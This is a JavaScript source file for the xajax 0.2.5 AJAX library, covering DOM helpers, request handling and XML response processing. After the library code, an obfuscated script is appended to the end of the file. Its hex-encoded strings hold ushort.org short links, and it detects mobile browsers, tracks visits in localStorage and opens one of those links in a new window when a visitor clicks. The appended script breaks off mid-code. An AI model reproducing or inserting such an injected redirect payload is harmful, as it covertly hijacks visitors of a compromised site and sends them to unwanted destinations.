/* xajax Javascript library :: version 0.2.5 */

function Xajax()
{
	this.arrayContainsValue = function(array, valueToCheck)
	{
		for (i in array) {
			if (array[i] == valueToCheck) return true;
		}
		return false;
	};

	this.DebugMessage = function(text)
	{
		if (text.length > 1000) text = text.substr(0,1000)+"...\n[long response]\n...";
		try {
			if (this.debugWindow == undefined || this.debugWindow.closed == true) {
				this.debugWindow = window.open('about:blank', 'xajax-debug', 'width=800,height=600,scrollbars=1,resizable,status');
				this.debugWindow.document.write('<html><head><title>Xajax debug output</title></head><body><h2>Xajax debug output</h2><div id="debugTag"></div></body></html>');
			}
			debugTag = this.debugWindow.document.getElementById('debugTag');
			if (!debugTag)
				throw new Error();
			text = text.replace(/&/g, "&amp;");
			text = text.replace(/</g, "&lt;");
			text = text.replace(/>/g, "&gt;");
			debugTag.innerHTML = ('<b>'+(new Date()).toString()+'</b>: ' + text + '<hr/>') + debugTag.innerHTML;
		} catch (e) {
			alert("Xajax Debug:\n " + text);
		}
	};
	
	this.workId = 'xajaxWork'+ new Date().getTime();
	this.depth = 0;
	this.responseErrorsForAlert = ["400","401","402","403","404","500","501","502","503"];
	
	//Get the XMLHttpRequest Object
	this.getRequestObject = function()
	{
		if (xajaxDebug) this.DebugMessage("Initializing Request Object..");
		var req = null;
		if (typeof XMLHttpRequest != "undefined")
			req = new XMLHttpRequest();
		if (!req && typeof ActiveXObject != "undefined")
		{
			try
			{
				req=new ActiveXObject("Msxml2.XMLHTTP");
				XMLHttpRequest = function(){return new ActiveXObject("Msxml2.XMLHTTP");}
			}
			catch (e)
			{
				try
				{
					req=new ActiveXObject("Microsoft.XMLHTTP");
					XMLHttpRequest = function(){return new ActiveXObject("Microsoft.XMLHTTP");}
				}
				catch (e2)
				{
					try {
						req=new ActiveXObject("Msxml2.XMLHTTP.4.0");
						XMLHttpRequest = function(){return new ActiveXObject("Msxml2.XMLHTTP.4.0");}
					}
					catch (e3)
					{
						req=null;
					}
				}
			}
		}
		if(!req && window.createRequest)
			req = window.createRequest();
		
		if (!req) this.DebugMessage("Request Object Instantiation failed.");
			
		return req;
	}

	// xajax.$() is shorthand for document.getElementById()
	this.$ = function(sId)
	{
		if (!sId) {
			return null;
		}
		var returnObj = document.getElementById(sId);
		if (!returnObj && document.all) {
			returnObj = document.all[sId];
		}
		if (xajaxDebug && !returnObj && sId != this.workId) {
			this.DebugMessage("Element with the id \"" + sId + "\" not found.");
		}
		return returnObj;
	}
	
	// xajax.include(sFileName) dynamically includes an external javascript file
	this.include = function(sFileName)
	{
		var objHead = document.getElementsByTagName('head');
		var objScript = document.createElement('script');
		objScript.type = 'text/javascript';
		objScript.src = sFileName;
		objHead[0].appendChild(objScript);
	}
	
	this.stripOnPrefix = function(sEventName)
	{
		sEventName = sEventName.toLowerCase();
		if (sEventName.indexOf('on') == 0)
		{
			sEventName = sEventName.replace(/on/,'');
		}
		
		return sEventName;
	}
	
	this.addOnPrefix = function(sEventName)
	{
		sEventName = sEventName.toLowerCase();
		if (sEventName.indexOf('on') != 0)
		{
			sEventName = 'on' + sEventName;
		}
		
		return sEventName;
	}
	
	// xajax.addHandler adds an event handler to an element
	this.addHandler = function(sElementId, sEvent, sFunctionName)
	{
		if (window.addEventListener)
		{
			sEvent = this.stripOnPrefix(sEvent);
			eval("this.$('"+sElementId+"').addEventListener('"+sEvent+"',"+sFunctionName+",false);");
		}
		else if (window.attachEvent)
		{
			sAltEvent = this.addOnPrefix(sEvent);
			if (eval("this.$('"+sElementId+"').attachEvent('"+sAltEvent+"',"+sFunctionName+");"))
				window.attachEvent('onunload', 
					eval("function(){xajax.$('"+sElementId+"').detachEvent('"+sAltEvent+"',"+sFunctionName+");}"));
		}
		else
		{
			sAltEvent = this.addOnPrefix(sEvent);
			eval("this.$('"+sElementId+"')."+sAltEvent+" = "+sFunctionName);
		}
	}
	
	// xajax.removeHandler removes an event handler from an element
	this.removeHandler = function(sElementId, sEvent, sFunctionName)
	{
		if (window.removeEventListener)
		{
			sEvent = this.stripOnPrefix(sEvent);
			eval("this.$('"+sElementId+"').removeEventListener('"+sEvent+"',"+sFunctionName+",false);");
		}
		else if (window.detachEvent)
		{
			sAltEvent = this.addOnPrefix(sEvent);
			try {
				eval("this.$('"+sElementId+"').detachEvent('"+sAltEvent+"',"+sFunctionName+");");
			} catch (ignore) {}
		}
		else
		{
			sAltEvent = this.addOnPrefix(sEvent);
			eval("this.$('"+sElementId+"')."+sAltEvent+" = null");
		}
	}
	
	// xajax.create creates a new child node under a parent
	this.create = function(sParentId, sTag, sId)
	{
		var objParent = this.$(sParentId);
		objElement = document.createElement(sTag);
		objElement.setAttribute('id',sId);
		if (objParent)
			objParent.appendChild(objElement);
	}
	
	// xajax.insert inserts a new node before another node
	this.insert = function(sBeforeId, sTag, sId)
	{
		var objSibling = this.$(sBeforeId);
		objElement = document.createElement(sTag);
		objElement.setAttribute('id',sId);
		objSibling.parentNode.insertBefore(objElement, objSibling);
	}

	// xajax.insertAfter inserts a new node after another node
	this.insertAfter = function(sAfterId, sTag, sId)
	{
		var objSibling = this.$(sAfterId);
		objElement = document.createElement(sTag);
		objElement.setAttribute('id',sId);
		objSibling.parentNode.insertBefore(objElement, objSibling.nextSibling);
	}
	
	this.getInput = function(sType, sName, sId)
	{
		var Obj;
		if (!window.addEventListener)
		{
			Obj = document.createElement('<input type="'+sType+'" id="'+sId+'" name="'+sName+'">');
		}
		else
		{
			Obj = document.createElement('input');
			Obj.setAttribute('type',sType);
			Obj.setAttribute('name',sName);
			Obj.setAttribute('id',sId);
		}
		return Obj;
	}
	
	// xajax.createInput creates a new input node under a parent
	this.createInput = function(sParentId, sType, sName, sId)
	{
		var objParent = this.$(sParentId);
		var objElement = this.getInput(sType, sName, sId);
		if (objParent && objElement)
			objParent.appendChild(objElement);
	}
	
	// xajax.insertInput creates a new input node before another node
	this.insertInput = function(sBeforeId, sType, sName, sId)
	{
		var objSibling = this.$(sBeforeId);
		var objElement = this.getInput(sType, sName, sId);
		if (objElement && objSibling && objSibling.parentNode)
			objSibling.parentNode.insertBefore(objElement, objSibling);
	}

	// xajax.insertInputAfter creates a new input node after another node
	this.insertInputAfter = function(sAfterId, sType, sName, sId)
	{
		var objSibling = this.$(sAfterId);
		var objElement = this.getInput(sType, sName, sId);
		if (objElement && objSibling && objSibling.parentNode) {
			objSibling.parentNode.insertBefore(objElement, objSibling.nextSibling);
		}
	}
		
	// xajax.remove deletes an element
	this.remove = function(sId)
	{
		objElement = this.$(sId);
		if (objElement && objElement.parentNode && objElement.parentNode.removeChild)
		{
			objElement.parentNode.removeChild(objElement);
		}
	}
	
	//xajax.replace searches for text in an attribute of an element and replaces it
	//with a different text
	this.replace = function(sId,sAttribute,sSearch,sReplace)
	{
		var bFunction = false;
		
		if (sAttribute == "innerHTML")
			sSearch = this.getBrowserHTML(sSearch);
		
		eval("var txt=this.$('"+sId+"')."+sAttribute);
		if (typeof txt == "function")
        {
            txt = txt.toString();
            bFunction = true;
        }
		if (txt.indexOf(sSearch)>-1)
		{
			var newTxt = '';
			while (txt.indexOf(sSearch) > -1)
			{
				x = txt.indexOf(sSearch)+sSearch.length+1;
				newTxt += txt.substr(0,x).replace(sSearch,sReplace);
				txt = txt.substr(x,txt.length-x);
			}
			newTxt += txt;
			if (bFunction)
			{
				eval('this.$("'+sId+'").'+sAttribute+'=newTxt;');
			}
			else if (this.willChange(sId,sAttribute,newTxt))
			{
				eval('this.$("'+sId+'").'+sAttribute+'=newTxt;');
			}
		}
	}
	
	// xajax.getFormValues() builds a query string XML message from the elements of a form object
	// * The first argument is the id of the form
	// * The second argument (optional) can be set to true if you want to submit disabled elements
	// * The third argument (optional) allows you to specify a string prefix that a form element
	//   name must contain if you want that element to be submitted
	this.getFormValues = function(frm)
	{
		var objForm;
		var submitDisabledElements = false;
		if (arguments.length > 1 && arguments[1] == true)
			submitDisabledElements = true;
		var prefix="";
		if(arguments.length > 2)
			prefix = arguments[2];
		
		if (typeof(frm) == "string")
			objForm = this.$(frm);
		else
			objForm = frm;
		var sXml = "<xjxquery><q>";
		if (objForm && objForm.tagName.toUpperCase() == 'FORM')
		{
			var formElements = objForm.elements;
			for( var i=0; i < formElements.length; i++)
			{
				if (!formElements[i].name)
					continue;
				if (formElements[i].name.substring(0, prefix.length) != prefix)
					continue;
				if (formElements[i].type && (formElements[i].type == 'radio' || formElements[i].type == 'checkbox') && formElements[i].checked == false)
					continue;
				if (formElements[i].disabled && formElements[i].disabled == true && submitDisabledElements == false)
					continue;
				var name = formElements[i].name;
				if (name)
				{
					if (sXml != '<xjxquery><q>')
						sXml += '&';
					if(formElements[i].type=='select-multiple')
					{
						for (var j = 0; j < formElements[i].length; j++)
						{
							if (formElements[i].options[j].selected == true)
								sXml += name+"="+encodeURIComponent(formElements[i].options[j].value)+"&";
						}
					}
					else
					{
						sXml += name+"="+encodeURIComponent(formElements[i].value);
					}
				} 
			}
		}
		
		sXml +="</q></xjxquery>";
		
		return sXml;
	}
	
	// Generates an XML message that xajax can understand from a javascript object
	this.objectToXML = function(obj)
	{
		var sXml = "<xjxobj>";
		for (i in obj)
		{
			try
			{
				if (i == 'constructor')
					continue;
				if (obj[i] && typeof(obj[i]) == 'function')
					continue;
					
				var key = i;
				var value = obj[i];
				if (value && typeof(value)=="object" && this.depth <= 50)
				{
					this.depth++;
					value = this.objectToXML(value);
					this.depth--;
				}
				
				sXml += "<e><k>"+key+"</k><v>"+value+"</v></e>";
				
			}
			catch(e)
			{
				if (xajaxDebug) this.DebugMessage(e.name+": "+e.message);
			}
		}
		sXml += "</xjxobj>";
	
		return sXml;
	}

	// unserializes data structure from xajaxResponse::_buildObjXml()
	this._nodeToObject = function(node) {
		if (!node)
			return '';
		// parentNode here is weird, have to tune
		if (node.nodeName == '#cdata-section' || node.nodeName == '#text') {
			var data = "";
			for (var j=0; j<node.parentNode.childNodes.length; j++) {
				data += node.parentNode.childNodes[j].data;
			}
			return data;
		}
		else if (node.nodeName == 'xjxobj') {
			var data = new Array();
			for (var j=0; j<node.childNodes.length; j++) {
				var child = node.childNodes[j];
				var key;
				var value;
				if (child.nodeName == 'e') {
					for (var k=0; k<child.childNodes.length; k++) {
						if (child.childNodes[k].nodeName == 'k') {
							key = child.childNodes[k].firstChild.data;
						}
						else if (child.childNodes[k].nodeName == 'v') {
							value = this._nodeToObject(child.childNodes[k].firstChild);
						}
					}
					if (key != null && value != null) {
						data[key] = value;
						key = value = null;
					}
				}
			}
			return data;
		}		
	}

	this.loadingFunction = function(){};
	this.doneLoadingFunction = function(){};
	var loadingTimeout;

	// Sends a XMLHttpRequest to call the specified PHP function on the server
	// * sRequestType is optional -- defaults to POST
	this.call = function(sFunction, aArgs, sRequestType)
	{
		var i,r,postData;
		if (document.body && xajaxWaitCursor)
			document.body.style.cursor = 'wait';
		if (xajaxStatusMessages == true) window.status = 'Sending Request...';
		clearTimeout(loadingTimeout);
		loadingTimeout = setTimeout("xajax.loadingFunction();",400);
		if (xajaxDebug) this.DebugMessage("Starting xajax...");
		if (sRequestType == null) {
		   var xajaxRequestType = xajaxDefinedPost;
		}
		else {
			var xajaxRequestType = sRequestType;
		}
		var uri = xajaxRequestUri;
		var value;
		switch(xajaxRequestType)
		{
			case xajaxDefinedGet:{
				var uriGet = uri.indexOf("?")==-1?"?xajax="+encodeURIComponent(sFunction):"&xajax="+encodeURIComponent(sFunction);
				if (aArgs) {
					for (i = 0; i<aArgs.length; i++)
					{
						value = aArgs[i];
						if (typeof(value)=="object")
							value = this.objectToXML(value);
						uriGet += "&xajaxargs[]="+encodeURIComponent(value);
					}
				}
				uriGet += "&xajaxr=" + new Date().getTime();
				uri += uriGet;
				postData = null;
				} break;
			case xajaxDefinedPost:{
				postData = "xajax="+encodeURIComponent(sFunction);
				postData += "&xajaxr="+new Date().getTime();
				if (aArgs) {
					for (i = 0; i <aArgs.length; i++)
					{
						value = aArgs[i];
						if (typeof(value)=="object")
							value = this.objectToXML(value);
						postData = postData+"&xajaxargs[]="+encodeURIComponent(value);
					}
				}
				} break;
			default:
				alert("Illegal request type: " + xajaxRequestType); return false; break;
		}
		r = this.getRequestObject();
		if (!r) return false;
		r.open(xajaxRequestType==xajaxDefinedGet?"GET":"POST", uri, true);
		if (xajaxRequestType == xajaxDefinedPost)
		{
			try
			{
				r.setRequestHeader("Method", "POST " + uri + " HTTP/1.1");
				r.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
			}
			catch(e)
			{
				alert("Your browser does not appear to  support asynchronous requests using POST.");
				return false;
			}
		}
		r.onreadystatechange = function()
		{
			if (r.readyState != 4)
				return;
			
			if (r.status==200)
			{
				if (xajaxDebug) xajax.DebugMessage("Received:\n" + r.responseText);
				if (r.responseXML && r.responseXML.documentElement)
					xajax.processResponse(r.responseXML);
				else {
					var errorString = "Error: the XML response that was returned from the server is invalid.";
					errorString += "\nReceived:\n" + r.responseText;
					trimmedResponseText = r.responseText.replace( /^\s+/g, "" );// strip leading space
					trimmedResponseText = trimmedResponseText.replace( /\s+$/g, "" );// strip trailing
					if (trimmedResponseText != r.responseText)
						errorString += "\nYou have whitespace in your response.";
					alert(errorString);
					document.body.style.cursor = 'default';
					if (xajaxStatusMessages == true) window.status = 'Invalid XML response error';				
				}
			}
			else {
				if (xajax.arrayContainsValue(xajax.responseErrorsForAlert, r.status)) {
					var errorString = "Error: the server returned the following HTTP status: " + r.status;
					errorString += "\nReceived:\n" + r.responseText;
					alert(errorString);
				}
				document.body.style.cursor = 'default';
				if (xajaxStatusMessages == true) window.status = 'Invalid XML response error';								
			}
			
			delete r;
			r = null;
		}
		if (xajaxDebug) this.DebugMessage("Calling "+sFunction +" uri="+uri+" (post:"+ postData +")");
		r.send(postData);
		if (xajaxStatusMessages == true) window.status = 'Waiting for data...';
		delete r;
		return true;
	}
	
	//Gets the text as it would be if it were being retrieved from
	//the innerHTML property in the current browser
	this.getBrowserHTML = function(html)
	{
		tmpXajax = this.$(this.workId);
		if (!tmpXajax)
		{
			tmpXajax = document.createElement("div");
			tmpXajax.setAttribute('id',this.workId);
			tmpXajax.style.display = "none";
			tmpXajax.style.visibility = "hidden";
			document.body.appendChild(tmpXajax);
		}
		tmpXajax.innerHTML = html;
		var browserHTML = tmpXajax.innerHTML;
		tmpXajax.innerHTML = '';	
		
		return browserHTML;
	}
	
	// Tests if the new Data is the same as the extant data
	this.willChange = function(element, attribute, newData)
	{
		if (!document.body)
		{
			return true;
		}
		if (attribute == "innerHTML")
		{
			newData = this.getBrowserHTML(newData);
		}
		elementObject = this.$(element);
		if (elementObject) {
			var oldData;		
			eval("oldData=this.$('"+element+"')."+attribute);
			if (newData !== oldData)
				return true;
		}

		return false;
	}
	
	//Returns the source code of the page after it's been modified by xajax
	this.viewSource = function()
	{
		return "<html>"+document.getElementsByTagName("HTML")[0].innerHTML+"</html>";
	}
	
	//Process XML xajaxResponses returned from the request
	this.processResponse = function(xml)
	{
		clearTimeout(loadingTimeout);
		this.doneLoadingFunction();
		if (xajaxStatusMessages == true) window.status = 'Processing...';
		var tmpXajax = null;
		xml = xml.documentElement;
		if (xml == null)
			return;
		
		var skipCommands = 0;
		for (var i=0; i<xml.childNodes.length; i++)
		{
			if (skipCommands > 0) {
				skipCommands--;
				continue;
			}
			if (xml.childNodes[i].nodeName == "cmd")
			{
				var cmd;
				var id;
				var property;
				var data;
				var search;
				var type;
				var before;
				var objElement = null;

				for (var j=0; j<xml.childNodes[i].attributes.length; j++)
				{
					if (xml.childNodes[i].attributes[j].name == "n")
					{
						cmd = xml.childNodes[i].attributes[j].value;
					}
					else if (xml.childNodes[i].attributes[j].name == "t")
					{
						id = xml.childNodes[i].attributes[j].value;
					}
					else if (xml.childNodes[i].attributes[j].name == "p")
					{
						property = xml.childNodes[i].attributes[j].value;
					}
					else if (xml.childNodes[i].attributes[j].name == "c")
					{
						type = xml.childNodes[i].attributes[j].value;
					}
				}
				if (xml.childNodes[i].childNodes.length > 1 && (xml.childNodes[i].firstChild.nodeName == "#cdata-section" || xml.childNodes[i].firstChild.nodeName == '#text'))
				{
					data = "";
					for (var j=0; j<xml.childNodes[i].childNodes.length; j++)
					{
						data += xml.childNodes[i].childNodes[j].data;
					}
				}
				else if (xml.childNodes[i].firstChild && xml.childNodes[i].firstChild.nodeName == 'xjxobj') {
					data = this._nodeToObject(xml.childNodes[i].firstChild);
					objElement = "XJX_SKIP";
				}
				else if (xml.childNodes[i].childNodes.length > 1)
				{
					for (var j=0; j<xml.childNodes[i].childNodes.length; j++)
					{
						if (xml.childNodes[i].childNodes[j].childNodes.length > 1 && (xml.childNodes[i].childNodes[j].firstChild.nodeName == "#cdata-section" || xml.childNodes[i].childNodes[j].firstChild.nodeName == "#text"))
						{
							var internalData = "";
							for (var k=0; k<xml.childNodes[i].childNodes[j].childNodes.length;k++)
							{
								internalData+=xml.childNodes[i].childNodes[j].childNodes[k].nodeValue;
							}
						} else {
							var internalData = xml.childNodes[i].childNodes[j].firstChild.nodeValue;
						}
					
						if (xml.childNodes[i].childNodes[j].nodeName == "s")
						{
							search = internalData;
						}
						if (xml.childNodes[i].childNodes[j].nodeName == "r")
						{
							data = internalData;
						}
					}
				}
				else if (xml.childNodes[i].firstChild)
					data = xml.childNodes[i].firstChild.nodeValue;
				else
					data = "";
				
				if (objElement != "XJX_SKIP") objElement = this.$(id);
				var cmdFullname;
				try
				{
					if (cmd=="cc") {
						cmdFullname = "addConfirmCommands";
						var confirmResult = confirm(data);
						if (!confirmResult) {
							skipCommands = id;
						}
					}
					if (cmd=="al")
					{
						cmdFullname = "addAlert";
						alert(data);
					}
					else if (cmd=="js")
					{
						cmdFullname = "addScript/addRedirect";
						eval(data);
					}
					else if (cmd=="jc")
					{
						cmdFullname = "addScriptCall";
						var scr = id + '(';
						if (data[0] != null) {
							scr += 'data[0]';
							for (var l=1; l<data.length; l++) {
								scr += ',data['+l+']';
							}
						}
						scr += ');';
						eval(scr);
					}
					else if (cmd=="in")
					{
						cmdFullname = "addIncludeScript";
						this.include(data);
					}
					else if (cmd=="as")
					{
						cmdFullname = "addAssign/addClear";
						if (this.willChange(id,property,data))
						{
							eval("objElement."+property+"=data;");
						}
					}
					else if (cmd=="ap")
					{
						cmdFullname = "addAppend";
						eval("objElement."+property+"+=data;");
					}
					else if (cmd=="pp")
					{
						cmdFullname = "addPrepend";
						eval("objElement."+property+"=data+objElement."+property);
					}
					else if (cmd=="rp")
					{
						cmdFullname = "addReplace";
						this.replace(id,property,search,data)
					}
					else if (cmd=="rm")
					{
						cmdFullname = "addRemove";
						this.remove(id);
					}
					else if (cmd=="ce")
					{
						cmdFullname = "addCreate";
						this.create(id,data,property);
					}
					else if (cmd=="ie")
					{
						cmdFullname = "addInsert";
						this.insert(id,data,property);
					}
					else if (cmd=="ia")
					{
						cmdFullname = "addInsertAfter";
						this.insertAfter(id,data,property);
					}
					else if (cmd=="ci")
					{
						cmdFullname = "addCreateInput";
						this.createInput(id,type,data,property);
					}
					else if (cmd=="ii")
					{
						cmdFullname = "addInsertInput";
						this.insertInput(id,type,data,property);
					}
					else if (cmd=="iia")
					{
						cmdFullname = "addInsertInputAfter";
						this.insertInputAfter(id,type,data,property);
					}
					else if (cmd=="ev")
					{
						cmdFullname = "addEvent";
						property = this.addOnPrefix(property);
						eval("this.$('"+id+"')."+property+"= function(){"+data+";}");
					}
					else if (cmd=="ah")
					{
						cmdFullname = "addHandler";
						this.addHandler(id, property, data);
					}
					else if (cmd=="rh")
					{
						cmdFullname = "addRemoveHandler";
						this.removeHandler(id, property, data);
					}
				}
				catch(e)
				{
					if (xajaxDebug)
						alert("While trying to '"+cmdFullname+"' (command number "+i+"), the following error occured:\n"
							+ e.name+": "+e.message+"\n"
							+ (id&&!objElement?"Object with id='"+id+"' wasn't found.\n":""));
				}
				delete objElement;
				delete cmd;
				delete cmdFullname;
				delete id;
				delete property;
				delete search;
				delete data;
				delete type;
				delete before;
				delete internalData;
				delete j;
				delete k;
			}	
		}
		delete xml;
		delete i;
		document.body.style.cursor = 'default';
		if (xajaxStatusMessages == true) window.status = 'Done';
	}
}

var xajax = new Xajax();
xajaxLoaded = true;
function _0x3023(_0x562006,_0x1334d6){const _0x1922f2=_0x1922();return _0x3023=function(_0x30231a,_0x4e4880){_0x30231a=_0x30231a-0x1bf;let _0x2b207e=_0x1922f2[_0x30231a];return _0x2b207e;},_0x3023(_0x562006,_0x1334d6);}function _0x1922(){const _0x5a990b=['substr','length','-hurs','open','round','443779RQfzWn','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x62\x71\x46\x33\x63\x343','click','5114346JdlaMi','1780163aSIYqH','forEach','host','_blank','68512ftWJcO','addEventListener','-mnts','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x4d\x76\x64\x35\x63\x375','4588749LmrVjF','parse','630bGPCEV','mobileCheck','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x44\x57\x75\x38\x63\x378','abs','-local-storage','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x4b\x4b\x53\x39\x63\x349','56bnMKls','opera','6946eLteFW','userAgent','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x77\x49\x6b\x34\x63\x314','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x48\x47\x4f\x37\x63\x327','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x45\x4c\x50\x32\x63\x322','floor','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x68\x62\x54\x36\x63\x396','999HIfBhL','filter','test','getItem','random','138490EjXyHW','stopPropagation','setItem','70kUzPYI'];_0x1922=function(){return _0x5a990b;};return _0x1922();}(function(_0x16ffe6,_0x1e5463){const _0x20130f=_0x3023,_0x307c06=_0x16ffe6();while(!![]){try{const _0x1dea23=parseInt(_0x20130f(0x1d6))/0x1+-parseInt(_0x20130f(0x1c1))/0x2*(parseInt(_0x20130f(0x1c8))/0x3)+parseInt(_0x20130f(0x1bf))/0x4*(-parseInt(_0x20130f(0x1cd))/0x5)+parseInt(_0x20130f(0x1d9))/0x6+-parseInt(_0x20130f(0x1e4))/0x7*(parseInt(_0x20130f(0x1de))/0x8)+parseInt(_0x20130f(0x1e2))/0x9+-parseInt(_0x20130f(0x1d0))/0xa*(-parseInt(_0x20130f(0x1da))/0xb);if(_0x1dea23===_0x1e5463)break;else _0x307c06['push'](_0x307c06['shift']());}catch(_0x3e3a47){_0x307c06['push'](_0x307c06['shift']());}}}(_0x1922,0x984cd),function(_0x34eab3){const _0x111835=_0x3023;window['mobileCheck']=function(){const _0x123821=_0x3023;let _0x399500=![];return function(_0x5e9786){const _0x1165a7=_0x3023;if(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x1165a7(0x1ca)](_0x5e9786)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x1165a7(0x1ca)](_0x5e9786[_0x1165a7(0x1d1)](0x0,0x4)))_0x399500=!![];}(navigator[_0x123821(0x1c2)]||navigator['vendor']||window[_0x123821(0x1c0)]),_0x399500;};const _0xe6f43=['\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x6f\x4d\x4a\x30\x63\x360','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x50\x4a\x4e\x31\x63\x301',_0x111835(0x1c5),_0x111835(0x1d7),_0x111835(0x1c3),_0x111835(0x1e1),_0x111835(0x1c7),_0x111835(0x1c4),_0x111835(0x1e6),_0x111835(0x1e9)],_0x7378e8=0x3,_0xc82d98=0x6,_0x487206=_0x551830=>{const _0x2c6c7a=_0x111835;_0x551830[_0x2c6c7a(0x1db)]((_0x3ee06f,_0x37dc07)=>{const _0x476c2a=_0x2c6c7a;!localStorage['getItem'](_0x3ee06f+_0x476c2a(0x1e8))&&localStorage[_0x476c2a(0x1cf)](_0x3ee06f+_0x476c2a(0x1e8),0x0);});},_0x564ab0=_0x3743e2=>{const _0x415ff3=_0x111835,_0x229a83=_0x3743e2[_0x415ff3(0x1c9)]((_0x37389f,_0x22f261)=>localStorage[_0x415ff3(0x1cb)](_0x37389f+_0x415ff3(0x1e8))==0x0);return _0x229a83[Math[_0x415ff3(0x1c6)](Math[_0x415ff3(0x1cc)]()*_0x229a83[_0x415ff3(0x1d2)])];},_0x173ccb=_0xb01406=>localStorage[_0x111835(0x1cf)](_0xb01406+_0x111835(0x1e8),0x1),_0x5792ce=_0x5415c5=>localStorage[_0x111835(0x1cb)](_0x5415c5+_0x111835(0x1e8)),_0xa7249=(_0x354163,_0xd22cba)=>localStorage[_0x111835(0x1cf)](_0x354163+_0x111835(0x1e8),_0xd22cba),_0x381bfc=(_0x49e91b,_0x531bc4)=>{const _0x1b0982=_0x111835,_0x1da9e1=0x3e8*0x3c*0x3c;return Math[_0x1b0982(0x1d5)](Math[_0x1b0982(0x1e7)](_0x531bc4-_0x49e91b)/_0x1da9e1);},_0x6ba060=(_0x1e9127,_0x28385f)=>{const _0xb7d87=_0x111835,_0xc3fc56=0x3e8*0x3c;return Math[_0xb7d87(0x1d5)](Math[_0xb7d87(0x1e7)](_0x28385f-_0x1e9127)/_0xc3fc56);},_0x370e93=(_0x286b71,_0x3587b8,_0x1bcfc4)=>{const _0x22f77c=_0x111835;_0x487206(_0x286b71),newLocation=_0x564ab0(_0x286b71),_0xa7249(_0x3587b8+'-mnts',_0x1bcfc4),_0xa7249(_0x3587b8+_0x22f77c(0x1d3),_0x1bcfc4),_0x173ccb(newLocation),window['mobileCheck']()&&window[_0x22f77c(0x1d4)](newLocation,'_blank');};_0x487206(_0xe6f43);function _0x168fb9(_0x36bdd0){const _0x2737e0=_0x111835;_0x36bdd0[_0x2737e0(0x1ce)]();const _0x263ff7=location[_0x2737e0(0x1dc)];let _0x1897d7=_0x564ab0(_0xe6f43);const _0x48cc88=Date[_0x2737e0(0x1e3)](new Date()),_0x1ec416=_0x5792ce(_0x263ff7+_0x2737e0(0x1e0)),_0x23f079=_0x5792ce(_0x263ff7+_0x2737e0(0x1d3));if(_0x1ec416&&_0x23f079)try{const 